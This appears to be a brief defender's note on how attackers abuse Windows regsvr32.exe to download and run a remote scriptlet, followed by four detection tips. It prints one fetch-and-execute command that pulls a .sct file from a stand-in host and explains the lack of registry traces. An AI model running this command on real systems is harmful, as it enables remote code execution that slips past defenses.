In computing, regsvr32 (Microsoft Register Server) is a command-line utility in Microsoft Windows operating systems 
for registering and unregistering DLLs and ActiveX controls in the Windows Registry.Adversaries can still use Regsvr32.exe on Windows
to download and execute files

Usage:
regSvr32 /s /n /u /i:http[:]//evil.php/evil.sct scrobj.dll

regsvr32 is invoking scrobj.dll to unregister COM objescts defined in the evil.sct. Malicious code will be used in the sct file.
The SCT file ( an XML file) has a registration tag in it that can contain VBScript or JScript code.  The file can have any extension.
It doesnâ€™t have to be .sct. There wiil be no artifacts left in registry if this utility is unregistering any COM object.

1.Look for regsvr32.exe prefetch files and Parsing the prefetch will provide the executed file. 
2.Command execution and arguments passed to regsvr32.exe using EDR solutions.
3.Look for the HTTP useragents with regsvr32 in the network recorders or the proxy logs.
4.Look for suspicious process in the system with parent process as regsvr32.
